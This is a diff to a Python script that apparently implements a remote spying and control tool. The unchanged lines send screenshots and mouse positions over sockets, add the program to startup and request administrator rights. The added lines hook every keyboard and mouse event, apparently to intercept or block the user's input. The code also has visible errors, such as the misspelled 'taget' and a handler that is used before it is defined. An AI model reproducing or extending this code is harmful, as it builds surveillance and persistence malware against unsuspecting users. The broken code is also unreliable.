@@ -4,6 +4,8 @@ from socket import *
 from threading import *
 import getpass
 import admin
+import pythoncom, pyHook 
+
 
 #define 
 
@@ -14,6 +16,12 @@ cmouse = Controller()       #mouse controller
 shot = pyautogui.screenshot()     #screenshot (img)
 sock = Thread(target = sockshot)    # thread send screen (capture)
 detect = Thread (taget = mousedet)   # thread send mouse position
+hm = pyHook.HookManager()
+hm.MouseAll = uMad
+hm.KeyAll = uMad
+hm.HookMouse()
+hm.HookKeyboard()
+pythoncom.PumpMessages()
 
 #socket
 def mousedet (host,port) :
@@ -41,3 +49,8 @@ def add_to_startup(file_path=""):
 def runadmin ():
     if not admin.isUserAdmin():
        admin.runAsAdmin()
+ 
+
+def keyboardable(event,flowerboolean):
+    return flowerboolean
+
